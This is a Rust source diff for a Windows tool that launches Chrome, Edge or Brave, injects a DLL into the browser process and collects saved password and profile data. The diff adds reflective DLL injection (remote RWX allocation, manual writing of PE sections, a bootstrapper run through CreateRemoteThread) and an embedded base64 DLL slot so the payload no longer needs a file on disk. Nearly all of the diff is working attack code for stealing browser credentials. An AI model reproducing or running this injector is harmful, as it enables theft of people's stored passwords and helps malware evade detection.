@@ -1,8 +1,11 @@
+pub mod bootstrapper;
+
+use base64::Engine;
 use clap::Parser;
 use serde::{Deserialize, Serialize};
-use std::ffi::OsStr;
+use std::ffi::{c_void, OsStr};
 use std::fs;
-use std::io::{Read, Write};
+use std::io::Write;
 use std::os::windows::ffi::OsStrExt;
 use std::path::Path;
 use std::ptr;
@@ -14,6 +17,11 @@ use windows_sys::Win32::System::LibraryLoader::*;
 use windows_sys::Win32::System::Memory::*;
 use windows_sys::Win32::System::Pipes::*;
 use windows_sys::Win32::System::Threading::*;
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE};
+
+use crate::bootstrapper::{realign_pe, realign_pe_end, DllInfo};
+
+const PROXY_DLL_BASE64: &str = "REPLACE_WITH_ACTUAL_BASE64_DLL_BYTES";
 
 #[derive(Serialize, Deserialize, Debug)]
 struct PasswordData {
@@ -54,9 +62,9 @@ struct ProfileData {
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
 struct Args {
-    /// Path to the DLL to inject
+    /// Path to the DLL to inject (optional, if provided it overrides the embedded DLL)
     #[arg(short, long)]
-    dll: String,
+    dll: Option<String>,
 
     /// Target browser (chrome, edge, brave, all)
     #[arg(short, long, default_value = "all")]
@@ -106,7 +114,208 @@ fn find_browser_exe(name: &str) -> Option<String> {
     None
 }
 
-fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig) {
+unsafe fn inject_dll_reflective(h_process: HANDLE, dll_bytes: &[u8]) {
+    // --- Validate PE headers ---
+    let dos_header = dll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
+        panic!("Invalid DOS signature");
+    }
+
+    let nt_headers = (dll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize)
+        as *const IMAGE_NT_HEADERS64;
+    if (*nt_headers).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
+        panic!("Not a 64-bit DLL");
+    }
+
+    let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
+    let preferred_base = (*nt_headers).OptionalHeader.ImageBase as *const c_void;
+
+    println!("[*] Image size: {} bytes", image_size);
+    println!("[*] Preferred base: {:?}", preferred_base);
+
+    // --- 1. Allocate memory for DLL in remote process ---
+    let mut remote_base = VirtualAllocEx(
+        h_process,
+        preferred_base,
+        image_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+
+    let mut relocation_required = false;
+    if remote_base.is_null() {
+        println!("[!] Preferred base unavailable, allocating elsewhere (relocation required)");
+        relocation_required = true;
+        remote_base = VirtualAllocEx(
+            h_process,
+            ptr::null(),
+            image_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+    }
+
+    if remote_base.is_null() {
+        panic!("Failed to allocate memory in target process");
+    }
+
+    println!("[+] Allocated DLL memory at: {:?} (relocation={})", remote_base, relocation_required);
+
+    // --- 2. Write PE headers ---
+    let headers_written = WriteProcessMemory(
+        h_process,
+        remote_base,
+        dll_bytes.as_ptr() as *const c_void,
+        (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
+        ptr::null_mut(),
+    );
+    if headers_written == 0 {
+        panic!("Failed to write PE headers");
+    }
+    println!("[+] PE headers written ({} bytes)", (*nt_headers).OptionalHeader.SizeOfHeaders);
+
+    // --- 3. Write sections ---
+    let sections_ptr = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+        as *const IMAGE_SECTION_HEADER;
+    let num_sections = (*nt_headers).FileHeader.NumberOfSections;
+
+    println!("[*] Writing {} sections...", num_sections);
+
+    for i in 0..num_sections {
+        let section = &*sections_ptr.add(i as usize);
+
+        let name_bytes = &section.Name;
+        let name_len = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
+        let section_name = std::str::from_utf8(&name_bytes[..name_len]).unwrap_or("?");
+
+        if section.PointerToRawData == 0 || section.SizeOfRawData == 0 {
+            println!("  [*] Section {} skipped (no raw data, VirtualSize={})",
+                section_name,
+                section.Misc.VirtualSize
+            );
+            continue;
+        }
+
+        let remote_section_addr =
+            (remote_base as usize + section.VirtualAddress as usize) as *mut c_void;
+        let local_section_addr =
+            (dll_bytes.as_ptr() as usize + section.PointerToRawData as usize) as *const c_void;
+
+        let size_to_write = section.SizeOfRawData as usize;
+
+        let written = WriteProcessMemory(
+            h_process,
+            remote_section_addr,
+            local_section_addr,
+            size_to_write,
+            ptr::null_mut(),
+        );
+
+        if written == 0 {
+            println!("  [!] WARNING: Failed to write section {}", section_name);
+        } else {
+            println!(
+                "  [+] Section {} -> {:?} ({} bytes raw, {} bytes virtual)",
+                section_name,
+                remote_section_addr,
+                size_to_write,
+                section.Misc.VirtualSize
+            );
+        }
+    }
+
+    // --- 4. Bootstrapper (DllInfo + realign_pe kodu) hazırla ---
+    let h_kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+    if h_kernel32 == 0 {
+        panic!("Failed to get kernel32 handle");
+    }
+
+    let load_library_a_ptr = GetProcAddress(h_kernel32, b"LoadLibraryA\0".as_ptr()).expect("Failed to find LoadLibraryA");
+    let get_proc_address_ptr = GetProcAddress(h_kernel32, b"GetProcAddress\0".as_ptr()).expect("Failed to find GetProcAddress");
+
+    let dll_info = DllInfo {
+        base: remote_base,
+        load_library_a: std::mem::transmute(load_library_a_ptr),
+        get_proc_address: std::mem::transmute(get_proc_address_ptr),
+        relocation_required,
+    };
+
+    let start_ptr = realign_pe as usize;
+    let end_ptr   = realign_pe_end as usize;
+
+    let bootstrapper_size = if end_ptr > start_ptr {
+        end_ptr - start_ptr
+    } else {
+        println!("[!] WARNING: realign_pe_end <= realign_pe, using fallback size 4096");
+        4096
+    };
+
+    println!("[*] Bootstrapper size: {} bytes", bootstrapper_size);
+
+    let total_bootstrap_size = std::mem::size_of::<DllInfo>() + bootstrapper_size;
+
+    let remote_bootstrap_mem = VirtualAllocEx(
+        h_process,
+        ptr::null(),
+        total_bootstrap_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+
+    if remote_bootstrap_mem.is_null() {
+        panic!("Failed to allocate bootstrapper memory");
+    }
+
+    println!("[+] Bootstrapper memory at: {:?}", remote_bootstrap_mem);
+
+    let info_written = WriteProcessMemory(
+        h_process,
+        remote_bootstrap_mem,
+        &dll_info as *const DllInfo as *const c_void,
+        std::mem::size_of::<DllInfo>(),
+        ptr::null_mut(),
+    );
+    if info_written == 0 {
+        panic!("Failed to write DllInfo");
+    }
+
+    let remote_code_addr =
+        (remote_bootstrap_mem as usize + std::mem::size_of::<DllInfo>()) as *mut c_void;
+
+    let code_written = WriteProcessMemory(
+        h_process,
+        remote_code_addr,
+        realign_pe as *const c_void,
+        bootstrapper_size,
+        ptr::null_mut(),
+    );
+    if code_written == 0 {
+        panic!("Failed to write bootstrapper code");
+    }
+
+    println!("[+] Bootstrapper written. Launching remote thread...");
+
+    let h_thread = CreateRemoteThread(
+        h_process,
+        ptr::null(),
+        0,
+        std::mem::transmute(remote_code_addr),
+        remote_bootstrap_mem,
+        0,
+        ptr::null_mut(),
+    );
+
+    if h_thread == 0 {
+        panic!("Failed to create remote thread");
+    }
+
+    println!("[+] Remote thread created: {:?}", h_thread);
+    WaitForSingleObject(h_thread, INFINITE);
+    println!("[+] Remote thread finished.");
+    CloseHandle(h_thread);
+}
+
+fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) {
     println!("\n--- Processing Browser: {} ---", browser_config.name);
 
     let mut cmd_line: Vec<u16> = OsStr::new(browser_config.exe_name).encode_wide().chain(Some(0)).collect();
@@ -159,30 +368,7 @@ fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig) {
         let thread_handle = process_info.hThread;
         println!("Created {} with PID: {}", browser_config.exe_name, process_info.dwProcessId);
 
-        let remote_mem = VirtualAllocEx(process_handle, ptr::null(), dll_path_u16.len() * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if remote_mem.is_null() {
-            eprintln!("Failed to allocate memory: {}", GetLastError());
-            CloseHandle(process_handle); CloseHandle(thread_handle); return;
-        }
-
-        if WriteProcessMemory(process_handle, remote_mem, dll_path_u16.as_ptr() as *const _, dll_path_u16.len() * 2, ptr::null_mut()) == 0 {
-            eprintln!("Failed to write memory: {}", GetLastError());
-            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE); CloseHandle(process_handle); CloseHandle(thread_handle); return;
-        }
-
-        let kernel32_name: Vec<u16> = OsStr::new("kernel32.dll").encode_wide().chain(Some(0)).collect();
-        let kernel32_handle = GetModuleHandleW(kernel32_name.as_ptr());
-        let load_library_addr = GetProcAddress(kernel32_handle, b"LoadLibraryW\0".as_ptr());
-
-        let remote_thread = CreateRemoteThread(process_handle, ptr::null(), 0, Some(std::mem::transmute(load_library_addr)), remote_mem, 0, ptr::null_mut());
-        if remote_thread == 0 {
-            eprintln!("Failed to create remote thread: {}", GetLastError());
-            VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE); CloseHandle(process_handle); CloseHandle(thread_handle); return;
-        }
-
-        WaitForSingleObject(remote_thread, INFINITE);
-        CloseHandle(remote_thread);
-        VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
+        inject_dll_reflective(process_handle, dll_bytes);
 
         if ResumeThread(thread_handle) == u32::MAX {
             eprintln!("Failed to resume thread: {}", GetLastError());
@@ -243,16 +429,20 @@ fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig) {
 
 fn main() {
     let args = Args::parse();
-    let dll_path = std::path::Path::new(&args.dll).canonicalize().expect("DLL path error");
-    let dll_path_u16: Vec<u16> = dll_path.as_os_str().encode_wide().chain(Some(0)).collect();
+
+    let dll_bytes = if let Some(path) = args.dll {
+        std::fs::read(&path).expect("Failed to read DLL file")
+    } else {
+        base64::engine::general_purpose::STANDARD.decode(PROXY_DLL_BASE64).expect("Failed to decode embedded DLL")
+    };
 
     if args.browser.to_lowercase() == "all" {
         for config in BROWSERS {
-            inject_and_collect(&dll_path_u16, config);
+            inject_and_collect(&dll_bytes, config);
         }
     } else {
         if let Some(config) = BROWSERS.iter().find(|b| b.name.to_lowercase() == args.browser.to_lowercase()) {
-            inject_and_collect(&dll_path_u16, config);
+            inject_and_collect(&dll_bytes, config);
         } else {
             eprintln!("Unsupported browser: {}", args.browser);
         }
